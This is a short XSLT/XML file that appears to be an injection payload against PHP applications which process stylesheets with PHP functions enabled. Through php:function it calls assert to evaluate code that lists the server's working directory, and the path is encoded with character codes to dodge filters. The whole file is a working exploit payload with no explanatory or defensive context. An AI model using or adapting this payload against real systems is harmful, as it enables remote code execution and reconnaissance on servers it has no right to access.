<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">  
	<body style="font-size:12pt">
	<xsl:value-of select="php:function('assert','var_dump(scandir(CHAR(46).CHAR(47)))==3')" />
</body>
		</html>
